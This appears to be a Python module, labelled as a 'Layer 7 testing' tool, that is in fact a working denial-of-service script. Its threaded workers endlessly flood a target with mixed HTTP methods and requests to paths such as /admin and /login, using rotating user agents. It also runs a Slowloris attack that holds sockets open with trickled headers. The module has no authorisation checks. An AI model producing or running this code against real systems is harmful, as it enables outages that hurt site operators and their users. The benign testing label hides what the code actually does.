#!/usr/bin/env python3
"""
Layer 7 (Application Layer) Testing Module
Tests HTTP, HTTPS, and other application layer protocols
"""

import requests
import threading
import time
import random
import socket
from colorama import Fore, Style
from urllib.parse import urlparse

class Layer7Tester:
    def __init__(self, target, port, threads=10, duration=60, verbose=False):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.verbose = verbose
        self.running = False
        self.requests_sent = 0
        self.successful_requests = 0
        self.failed_requests = 0
        
        # Common User-Agents
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0'
        ]
        
        # HTTP methods to test
        self.http_methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS']
        
        # Common paths to test
        self.paths = [
            '/', '/index.html', '/admin', '/login', '/api', '/robots.txt',
            '/sitemap.xml', '/favicon.ico', '/.well-known/security.txt'
        ]

    def get_protocol(self):
        """Determine the protocol based on port"""
        if self.port == 443:
            return 'https'
        elif self.port == 80:
            return 'http'
        else:
            return 'http'  # Default to HTTP

    def create_session(self):
        """Create a requests session with custom headers"""
        session = requests.Session()
        session.headers.update({
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        return session

    def http_test(self):
        """Perform HTTP layer 7 tests"""
        protocol = self.get_protocol()
        url = f"{protocol}://{self.target}:{self.port}"
        
        session = self.create_session()
        
        try:
            # Test different HTTP methods
            for method in self.http_methods:
                if not self.running:
                    break
                    
                try:
                    if method == 'GET':
                        response = session.get(url, timeout=10)
                    elif method == 'POST':
                        response = session.post(url, data={'test': 'data'}, timeout=10)
                    elif method == 'HEAD':
                        response = session.head(url, timeout=10)
                    elif method == 'PUT':
                        response = session.put(url, data={'test': 'data'}, timeout=10)
                    elif method == 'DELETE':
                        response = session.delete(url, timeout=10)
                    elif method == 'OPTIONS':
                        response = session.options(url, timeout=10)
                    
                    self.requests_sent += 1
                    if response.status_code < 500:
                        self.successful_requests += 1
                        if self.verbose:
                            print(f"{Fore.GREEN}[+] {method} {url} - Status: {response.status_code}{Style.RESET_ALL}")
                    else:
                        self.failed_requests += 1
                        if self.verbose:
                            print(f"{Fore.YELLOW}[!] {method} {url} - Status: {response.status_code}{Style.RESET_ALL}")
                            
                except requests.exceptions.RequestException as e:
                    self.requests_sent += 1
                    self.failed_requests += 1
                    if self.verbose:
                        print(f"{Fore.RED}[-] {method} {url} - Error: {e}{Style.RESET_ALL}")
            
            # Test different paths
            for path in self.paths:
                if not self.running:
                    break
                    
                test_url = f"{url}{path}"
                try:
                    response = session.get(test_url, timeout=10)
                    self.requests_sent += 1
                    if response.status_code < 500:
                        self.successful_requests += 1
                        if self.verbose:
                            print(f"{Fore.GREEN}[+] GET {test_url} - Status: {response.status_code}{Style.RESET_ALL}")
                    else:
                        self.failed_requests += 1
                        if self.verbose:
                            print(f"{Fore.YELLOW}[!] GET {test_url} - Status: {response.status_code}{Style.RESET_ALL}")
                            
                except requests.exceptions.RequestException as e:
                    self.requests_sent += 1
                    self.failed_requests += 1
                    if self.verbose:
                        print(f"{Fore.RED}[-] GET {test_url} - Error: {e}{Style.RESET_ALL}")
                        
        except Exception as e:
            if self.verbose:
                print(f"{Fore.RED}[-] Session error: {e}{Style.RESET_ALL}")

    def slowloris_test(self):
        """Perform Slowloris attack simulation"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target, self.port))
            
            # Send partial HTTP request
            sock.send(f"GET / HTTP/1.1\r\nHost: {self.target}\r\n".encode())
            
            # Keep connection alive
            while self.running:
                try:
                    sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                except:
                    break
                    
            sock.close()
            
        except Exception as e:
            if self.verbose:
                print(f"{Fore.RED}[-] Slowloris error: {e}{Style.RESET_ALL}")

    def worker(self):
        """Worker thread function"""
        while self.running:
            self.http_test()

    def slowloris_worker(self):
        """Slowloris worker thread"""
        while self.running:
            self.slowloris_test()

    def run_tests(self):
        """Run all Layer 7 tests"""
        print(f"{Fore.CYAN}[*] Starting Layer 7 tests against {self.target}:{self.port}{Style.RESET_ALL}")
        
        self.running = True
        start_time = time.time()
        
        # Start HTTP test threads
        http_threads = []
        for _ in range(self.threads):
            thread = threading.Thread(target=self.worker)
            thread.daemon = True
            thread.start()
            http_threads.append(thread)
        
        # Start Slowloris threads (fewer threads for connection-based attack)
        slowloris_threads = []
        for _ in range(min(5, self.threads // 2)):
            thread = threading.Thread(target=self.slowloris_worker)
            thread.daemon = True
            thread.start()
            slowloris_threads.append(thread)
        
        # Monitor progress
        try:
            while time.time() - start_time < self.duration:
                elapsed = time.time() - start_time
                remaining = self.duration - elapsed
                
                print(f"\r{Fore.YELLOW}[*] Progress: {elapsed:.1f}s/{self.duration}s | "
                      f"Requests: {self.requests_sent} | "
                      f"Success: {self.successful_requests} | "
                      f"Failed: {self.failed_requests} | "
                      f"Remaining: {remaining:.1f}s{Style.RESET_ALL}", end="")
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Test interrupted{Style.RESET_ALL}")
        
        # Stop all threads
        self.running = False
        
        # Wait for threads to finish
        for thread in http_threads + slowloris_threads:
            thread.join(timeout=1)
        
        # Print final results
        print(f"\n{Fore.GREEN}[+] Layer 7 test completed{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Total requests: {self.requests_sent}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Successful: {self.successful_requests}{Style.RESET_ALL}")
        print(f"{Fore.RED}Failed: {self.failed_requests}{Style.RESET_ALL}")
        
        if self.requests_sent > 0:
            success_rate = (self.successful_requests / self.requests_sent) * 100
            print(f"{Fore.YELLOW}Success rate: {success_rate:.1f}%{Style.RESET_ALL}") 